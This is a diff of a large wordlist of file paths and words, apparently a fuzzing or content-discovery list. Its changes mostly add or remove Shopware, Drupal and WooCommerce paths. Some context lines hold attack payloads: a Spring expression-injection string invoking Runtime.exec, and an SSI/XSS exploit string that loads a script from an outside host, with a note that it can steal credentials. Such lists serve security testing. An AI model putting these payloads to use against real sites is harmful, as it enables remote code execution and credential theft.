@@ -43888,7 +43888,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 669-update-addon-indices.sql
 67-update-fields.sql
 676-drop-category-carrier-region-columns.sql
-67632-fix-select-icon-overlap-wp70
 677-drop-featured-tables.sql
 67drop
 682-remove-waffle-soft-delete.sql
@@ -56204,6 +56203,13 @@ administration/resources/app/administration/src/app/component/rule/sw-condition-
 administration/resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.html.twig
 administration/resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.scss
 administration/resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.spec.js
+administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/index.ts
+administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 administration/resources/app/administration/src/app/directive/dragdrop.directive.spec.js
 administration/resources/app/administration/src/app/directive/dragdrop.directive.ts
 administration/resources/app/administration/src/core/service/api/update.api.service.spec.js
@@ -56377,6 +56383,13 @@ administration/src/app/component/rule/sw-condition-type-select/index.js
 administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.html.twig
 administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.scss
 administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.spec.js
+administration/src/app/component/structure/sw-ui-shell-update-2026-modal/index.ts
+administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 administration/src/app/directive/dragdrop.directive.spec.js
 administration/src/app/directive/dragdrop.directive.ts
 administration/src/core/service/api/update.api.service.spec.js
@@ -62263,6 +62276,13 @@ app/administration/src/app/component/rule/sw-condition-type-select/index.js
 app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.html.twig
 app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.scss
 app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.spec.js
+app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/index.ts
+app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 app/administration/src/app/directive/dragdrop.directive.spec.js
 app/administration/src/app/directive/dragdrop.directive.ts
 app/administration/src/core/service/api/update.api.service.spec.js
@@ -62785,6 +62805,13 @@ app/component/rule/sw-condition-type-select/index.js
 app/component/rule/sw-condition-type-select/sw-condition-type-select.html.twig
 app/component/rule/sw-condition-type-select/sw-condition-type-select.scss
 app/component/rule/sw-condition-type-select/sw-condition-type-select.spec.js
+app/component/structure/sw-ui-shell-update-2026-modal/index.ts
+app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 app/components/custom-theme-settings/select.hbs
 app/components/custom-theme-settings/select.js
 app/components/editor/modals/delete-snippet.hbs
@@ -72542,12 +72569,13 @@ changelog/57935-update-blueprint-docs
 changelog/58792-update-blueprint-doc-exporter-ui
 changelog/61753-fix-support-composer-update
 changelog/66078-update-scaffold-flat-config
-changelog/67632-fix-select-icon-overlap-wp70
 changelog/_unreleased/2025-10-15-fix-select-result-list-not-loading-the-next-page.md
 changelog/_unreleased/2025-10-30-add-new-url-update-command.md
 changelog/dev-add-note-drop-image-layout
 changelog/dev-ci-lint-monorepo-job-update
 changelog/dev-drop-phpunit-and-bump-symfony-process
+changelog/dev-update-cookie-security
+changelog/dev-update-dompurify-security
 changelog/fix-beta-tester-delete-option-error
 changelog/fix-outofstock-update-since
 changelog/fix-product-editor-images-drop-error
@@ -76206,6 +76234,13 @@ component/rule/sw-condition-type-select/sw-condition-type-select.scss
 component/rule/sw-condition-type-select/sw-condition-type-select.spec.js
 component/select-type-grid.js
 component/static-type-select.js
+component/structure/sw-ui-shell-update-2026-modal/index.ts
+component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 component/sw-bulk-edit-order/sw-bulk-edit-order-documents-delete-documents/index.js
 component/sw-bulk-edit-order/sw-bulk-edit-order-documents-delete-documents/sw-bulk-edit-order-documents-delete-documents.html.twig
 component/sw-bulk-edit-order/sw-bulk-edit-order-documents-delete-documents/sw-bulk-edit-order-documents-delete-documents.spec.js
@@ -78892,6 +78927,7 @@ core/modules/system/tests/fixtures/update/system.action.send_email_2815379.yml
 core/modules/system/tests/fixtures/update/uninstall-ban.php
 core/modules/system/tests/fixtures/update/uninstall-contact.php
 core/modules/system/tests/fixtures/update/uninstall-history.php
+core/modules/system/tests/fixtures/update/uninstall-shortcut.php
 core/modules/system/tests/fixtures/update/views.view.entity_test_mul_revlog_for_2248983.yml
 core/modules/system/tests/fixtures/update/views.view.entity_test_revlog_for_2248983.yml
 core/modules/system/tests/modules/ajax_test/js/insert-ajax.es6.js
@@ -79901,7 +79937,6 @@ core/themes/default_admin/migration/media/icons/general/drop.svg
 core/themes/default_admin/templates/admin/update-project-status.html.twig
 core/themes/default_admin/templates/admin/update-version.html.twig
 core/themes/olivero/olivero.post_update.php
-core/themes/olivero/tests/src/functional/update/oliveropostupdatetest.php
 core/themes/seven/css/classy/components/tableselect.css
 core/themes/seven/css/components/update-status.css
 core/themes/seven/css/theme/update-report.css
@@ -88291,6 +88326,8 @@ dev-shopdrop
 dev-union
 dev-update
 dev-update-adfs2
+dev-update-cookie-security
+dev-update-dompurify-security
 dev-userselect-taiseigr
 dev-vendor-shopdrop
 dev.caracreditunion.ie/
@@ -94594,6 +94631,7 @@ expfieldname.2.update.sqlpp
 expirationalter.sql
 explain_non_select.inc
 explat/changelog/dev-ci-lint-monorepo-job-update
+explat/changelog/dev-update-cookie-security
 explicitimplicit.exec.out
 exploit description: this works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  this can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  this is one of the lesser used but more useful xss vectors.
 exploit string: <!--#exec cmd="/bin/echo '<script src'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></script>'"-->
@@ -96894,6 +96932,7 @@ fixtures/update/test_table_css_class.php
 fixtures/update/uninstall-ban.php
 fixtures/update/uninstall-contact.php
 fixtures/update/uninstall-history.php
+fixtures/update/uninstall-shortcut.php
 fixtures/update/views-block-items-per-page.php
 fixtures/update/views.view.node_link_update_test.yml
 fixtures/update/views.view.test_another_broken_config_multi_value.yml
@@ -98832,7 +98871,6 @@ functional/update/menublockdepthtest.php
 functional/update/menutreestorageschemaupdatetest.php
 functional/update/navigationupdatetest.php
 functional/update/nodecontenttranslationupdatetest.php
-functional/update/oliveropostupdatetest.php
 functional/update/pathaliasrevisionindexesupdatepathtest.php
 functional/update/readme.txt
 functional/update/removepathkeytest.php
@@ -102156,7 +102194,6 @@ http/controllers/v1/admin/update/finishupdatecontroller.php
 http/controllers/v1/admin/update/migrateupdatecontroller.php
 http/controllers/v1/admin/update/unzipupdatecontroller.php
 http/controllers/v1/admin/update/updatecontroller.php
-http://raindrop.io/robots.txt
 http_feed.2.update.sqlpp
 http_feed.6.update.sqlpp
 http_feed_json.2.update.sqlpp
@@ -107590,6 +107627,7 @@ js/experimental/changelog/dev-ci-lint-monorepo-job-update
 js/experimental/changelog/update-remove-banner-layout-from-inbox-note
 js/experimental/changelog/update-storybook_documentation
 js/explat/changelog/dev-ci-lint-monorepo-job-update
+js/explat/changelog/dev-update-cookie-security
 js/expression-evaluation/changelog/dev-ci-lint-monorepo-job-update
 js/extend-cart-checkout-block/changelog/66078-update-scaffold-flat-config
 js/extend-cart-checkout-block/changelog/update-php-dev-dependency-security-patches
@@ -107760,6 +107798,7 @@ js/public.countryselect.js
 js/public.filterlevelselect.js
 js/regions-tax-select.js
 js/remote-logging/changelog/dev-ci-lint-monorepo-job-update
+js/sanitize/changelog/dev-update-dompurify-security
 js/script.aculo.us/dragdrop.js
 js/scriptaculous/dragdrop.js
 js/settings-editor/changelog/update-settings-edits
@@ -116110,6 +116149,7 @@ modules/system/tests/fixtures/update/remove-description-from-user-register-form-
 modules/system/tests/fixtures/update/uninstall-ban.php
 modules/system/tests/fixtures/update/uninstall-contact.php
 modules/system/tests/fixtures/update/uninstall-history.php
+modules/system/tests/fixtures/update/uninstall-shortcut.php
 modules/system/tests/modules/ajax_test/js/insert-ajax.es6.js
 modules/system/tests/modules/ajax_test/js/insert-ajax.js
 modules/system/tests/modules/entity_test/update/entity_definition_updates_8001.inc
@@ -120796,7 +120836,6 @@ olist-jaccard.2.update.sqlpp
 oliver.schowalter-hay
 olivero.post_update.php
 olivero/olivero.post_update.php
-olivero/tests/src/functional/update/oliveropostupdatetest.php
 ols-fw-update.exe
 olya.buhgalter
 olympicsupdate-com
@@ -122855,6 +122894,7 @@ packages/js/experimental/changelog/dev-ci-lint-monorepo-job-update
 packages/js/experimental/changelog/update-remove-banner-layout-from-inbox-note
 packages/js/experimental/changelog/update-storybook_documentation
 packages/js/explat/changelog/dev-ci-lint-monorepo-job-update
+packages/js/explat/changelog/dev-update-cookie-security
 packages/js/expression-evaluation/changelog/dev-ci-lint-monorepo-job-update
 packages/js/extend-cart-checkout-block/changelog/66078-update-scaffold-flat-config
 packages/js/extend-cart-checkout-block/changelog/update-php-dev-dependency-security-patches
@@ -122936,6 +122976,7 @@ packages/js/product-editor/src/components/product-select/styles.scss
 packages/js/product-editor/src/components/product-select/types.ts
 packages/js/product-editor/src/utils/defer-select-in-focus.ts
 packages/js/remote-logging/changelog/dev-ci-lint-monorepo-job-update
+packages/js/sanitize/changelog/dev-update-dompurify-security
 packages/js/settings-editor/changelog/update-settings-edits
 packages/js/settings-editor/changelog/update-settings-return-to-wc-home
 packages/js/settings-editor/src/form-controls/select.tsx
@@ -122963,8 +123004,6 @@ packages/php/blueprint/changelog/update-php-dev-dependency-security-patches
 packages/php/blueprint/changelog/update-wpcs-3-4-1
 packages/php/blueprint/changelog/woo6-97-update-runsql-trust-boundary-docs
 packages/php/remote-specs-validation/changelog/dev-ci-lint-monorepo-job-update
-packages/php/woocommerce-analytics/changelog/update-php-dev-dependency-security-patches
-packages/php/woocommerce-analytics/changelog/update-wpcs-3-4-1
 packages/php/woocommerce-subscriptions-engine/changelog/update-php-dev-dependency-security-patches
 packages/php/woocommerce-subscriptions-engine/changelog/update-woosubs-engine-make-phpstan-ci-required
 packages/php/woocommerce-subscriptions-engine/changelog/update-wpcs-3-4-1
@@ -124566,8 +124605,6 @@ php/src/trangebuttom_9_delete.php
 php/src/userbuttom_9_delete.php
 php/update.php
 php/vendor/composer/autoload_files.php
-php/woocommerce-analytics/changelog/update-php-dev-dependency-security-patches
-php/woocommerce-analytics/changelog/update-wpcs-3-4-1
 php/woocommerce-subscriptions-engine/changelog/update-php-dev-dependency-security-patches
 php/woocommerce-subscriptions-engine/changelog/update-woosubs-engine-make-phpstan-ci-required
 php/woocommerce-subscriptions-engine/changelog/update-wpcs-3-4-1
@@ -125514,7 +125551,6 @@ plugins/woocommerce-beta-tester/src/tools/commands/trigger-update-callbacks.js
 plugins/woocommerce-beta-tester/src/tools/commands/update-block-template-logging-threshold.tsx
 plugins/woocommerce/bin/package-update-textdomain.js
 plugins/woocommerce/bin/post-update.sh
-plugins/woocommerce/changelog/67632-fix-select-icon-overlap-wp70
 plugins/woocommerce/changelog/fix-outofstock-update-since
 plugins/woocommerce/changelog/fix-update-antom-icon
 plugins/woocommerce/changelog/update-action-scheduler-via-automation
@@ -132770,6 +132806,13 @@ resources/app/administration/src/app/component/rule/sw-condition-type-select/ind
 resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.html.twig
 resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.scss
 resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.spec.js
+resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/index.ts
+resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 resources/app/administration/src/app/directive/dragdrop.directive.spec.js
 resources/app/administration/src/app/directive/dragdrop.directive.ts
 resources/app/administration/src/core/service/api/update.api.service.spec.js
@@ -135183,6 +135226,7 @@ sandrop
 sandwich,blt,dagwood sandwich,sloppy joe,swiss cheese sandwich,bacon-lettuce-tomato sandwich,canape,cheeseburger,corned beef sandwich,double-decker sandwich,drag in,edge in,egg salad sandwich,foist in,fudge in,grilled cheese sandwich,grinder,ham sandwich,hamburger,hoagy,hot dog,implant in,inject in,insert in,insinuate in,intercalate,interjaculate,interject,interpolate,interpose,intervene,introduce in,intrude,lug in,pastrami sandwich,poor boy,put between,run in,smuggle in,squeeze in,submarine sandwich,throw in,thrust in,tuna salad sandwich,tunaburger,wedge in,work in,worm in
 sanernow_update.json
 sanitaer-union
+sanitize/changelog/dev-update-dompurify-security
 sanjuanupdate-com
 sannewalter
 sans99wedupdate
@@ -145714,6 +145758,13 @@ src/administration/resources/app/administration/src/app/component/rule/sw-condit
 src/administration/resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.html.twig
 src/administration/resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.scss
 src/administration/resources/app/administration/src/app/component/rule/sw-condition-type-select/sw-condition-type-select.spec.js
+src/administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/index.ts
+src/administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+src/administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+src/administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+src/administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+src/administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+src/administration/resources/app/administration/src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 src/administration/resources/app/administration/src/app/directive/dragdrop.directive.spec.js
 src/administration/resources/app/administration/src/app/directive/dragdrop.directive.ts
 src/administration/resources/app/administration/src/core/service/api/update.api.service.spec.js
@@ -145893,6 +145944,13 @@ src/app/component/rule/sw-condition-type-select/index.js
 src/app/component/rule/sw-condition-type-select/sw-condition-type-select.html.twig
 src/app/component/rule/sw-condition-type-select/sw-condition-type-select.scss
 src/app/component/rule/sw-condition-type-select/sw-condition-type-select.spec.js
+src/app/component/structure/sw-ui-shell-update-2026-modal/index.ts
+src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+src/app/component/structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 src/app/directive/dragdrop.directive.spec.js
 src/app/directive/dragdrop.directive.ts
 src/applications/appcenter/service/data/pwdbupdate.php
@@ -146280,7 +146338,6 @@ src/functional/update/menublockdepthtest.php
 src/functional/update/menutreestorageschemaupdatetest.php
 src/functional/update/navigationupdatetest.php
 src/functional/update/nodecontenttranslationupdatetest.php
-src/functional/update/oliveropostupdatetest.php
 src/functional/update/pathaliasrevisionindexesupdatepathtest.php
 src/functional/update/readme.txt
 src/functional/update/removepathkeytest.php
@@ -148741,6 +148798,13 @@ struct_union.rb
 structboost_1_1geometry_1_1resolve__strategy_1_1convex__hull__insert.xml
 structboost_1_1geometry_1_1resolve__strategy_1_1simplify__insert.xml
 structboost_1_1geometry_1_1resolve__variant_1_1convex__hull__insert.xml
+structure/sw-ui-shell-update-2026-modal/index.ts
+structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+structure/sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 structurenodedelete
 structurenodeupdate
 structurenodeuserdelete
@@ -149838,6 +149902,19 @@ sw-sorting-select/sw-sorting-select.html.twig
 sw-sorting-select/sw-sorting-select.scss
 sw-status-update.xml
 sw-status-update.xml-qt.patch
+sw-ui-shell-update-2026-modal.html.twig
+sw-ui-shell-update-2026-modal.scss
+sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
+sw-ui-shell-update-2026-modal/index.ts
+sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.html.twig
+sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.scss
+sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/create-wrapper.ts
+sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/pages.spec.ts
+sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/theme-select.spec.ts
+sw-ui-shell-update-2026-modal/sw-ui-shell-update-2026-modal.spec/visibility.spec.ts
 sw-update
 sw-update-geoip
 sw-update-staging-geoip
@@ -150376,6 +150453,7 @@ system/tests/fixtures/update/remove-description-from-user-register-form-mode.php
 system/tests/fixtures/update/uninstall-ban.php
 system/tests/fixtures/update/uninstall-contact.php
 system/tests/fixtures/update/uninstall-history.php
+system/tests/fixtures/update/uninstall-shortcut.php
 system/tests/modules/ajax_test/js/insert-ajax.es6.js
 system/tests/modules/ajax_test/js/insert-ajax.js
 system/tests/modules/entity_test/update/entity_definition_updates_8001.inc
@@ -152556,6 +152634,7 @@ tests/fixtures/update/test_table_css_class.php
 tests/fixtures/update/uninstall-ban.php
 tests/fixtures/update/uninstall-contact.php
 tests/fixtures/update/uninstall-history.php
+tests/fixtures/update/uninstall-shortcut.php
 tests/fixtures/update/views-block-items-per-page.php
 tests/fixtures/update/views.view.node_link_update_test.yml
 tests/fixtures/update/views.view.test_another_broken_config_multi_value.yml
@@ -152838,7 +152917,6 @@ tests/src/functional/update/menublockdepthtest.php
 tests/src/functional/update/menutreestorageschemaupdatetest.php
 tests/src/functional/update/navigationupdatetest.php
 tests/src/functional/update/nodecontenttranslationupdatetest.php
-tests/src/functional/update/oliveropostupdatetest.php
 tests/src/functional/update/pathaliasrevisionindexesupdatepathtest.php
 tests/src/functional/update/readme.txt
 tests/src/functional/update/removepathkeytest.php
@@ -153459,6 +153537,7 @@ them,i,i myself,alter,alter ego,alterum,better self,bureaucracy,directorate,ego,
 theme-engine/middleware/update-global-template-options.js
 theme-engine/middleware/update-local-template-options.js
 theme-select
+theme-select.spec.ts
 theme-update-checker.php
 theme-update-mode
 theme-updates/theme-update-checker.php
@@ -153565,7 +153644,6 @@ themes/new-theme/js/pages/product/shop/pre-select-product-shop/index.ts
 themes/new-theme/js/pages/product/shop/select-shop-modal.ts
 themes/new-theme/js/pages/themes/delete-theme-handler.ts
 themes/olivero/olivero.post_update.php
-themes/olivero/tests/src/functional/update/oliveropostupdatetest.php
 themes/pc2/assets/js/date-time/select.monthselect.html
 themes/pc2/assets/js/date-time/select.yearselect.html
 themes/pc2/assets/js/div.chzn-drop.html
@@ -169507,7 +169585,6 @@ update/new/test_files_diff.php
 update/nodecontenttranslationupdatetest.php
 update/notifications.ts
 update/old/test_files_diff.php
-update/oliveropostupdatetest.php
 update/operations.ts
 update/panels.ts
 update/pathaliasrevisionindexesupdatepathtest.php
@@ -169873,6 +169950,7 @@ update/translations.ts
 update/uninstall-ban.php
 update/uninstall-contact.php
 update/uninstall-history.php
+update/uninstall-shortcut.php
 update/unzipupdatecontroller.php
 update/update.api.php
 update/update.authorize.inc
@@ -176460,8 +176538,6 @@ woocommerce-admin-update.php
 woocommerce-admin/db-updates/class-wc-tests-update-is-read-from-last-read.php
 woocommerce-all-price-update
 woocommerce-alter-inventory
-woocommerce-analytics/changelog/update-php-dev-dependency-security-patches
-woocommerce-analytics/changelog/update-wpcs-3-4-1
 woocommerce-beta-tester/api/admin-notes/delete-all-notes.php
 woocommerce-beta-tester/api/tools/delete-all-products.php
 woocommerce-beta-tester/api/tools/trigger-update-callbacks.php
@@ -176500,7 +176576,6 @@ woocommerce-update-2.4.1.php
 woocommerce-update-2.4.php
 woocommerce/bin/package-update-textdomain.js
 woocommerce/bin/post-update.sh
-woocommerce/changelog/67632-fix-select-icon-overlap-wp70
 woocommerce/changelog/fix-outofstock-update-since
 woocommerce/changelog/fix-update-antom-icon
 woocommerce/changelog/update-action-scheduler-via-automation
